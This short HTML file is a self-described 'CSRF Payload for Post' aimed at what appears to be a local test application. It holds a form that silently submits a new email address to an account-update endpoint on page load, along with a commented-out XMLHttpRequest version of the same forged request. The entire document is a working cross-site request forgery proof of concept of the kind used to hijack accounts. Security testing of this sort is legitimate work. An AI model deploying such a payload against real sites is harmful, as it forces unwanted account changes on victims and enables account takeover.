<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-7">
<title>CSRF</title>
</head>

<body>
	CSRF Payload for Post
	 <form action="http://127.0.0.1:8080/painTest/restricted/result/csrf" method="POST" id="updateEmail">
		<input type="text" name="email" value="test@best.com">
	</form>
</body>

<script >
	/*var httpRequest=new XMLHttpRequest();
	//httpRequest.open("POST", "restricted/result/csrf", false);
	httpRequest.open("POST", "http://127.0.0.1:8080/painTest/restricted/result/csrf", false);
	httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	httpRequest.send("email=jamdagni");
	console.log(httpRequest.responseText); */
	document.getElementById("updateEmail").submit();
</script>

</html>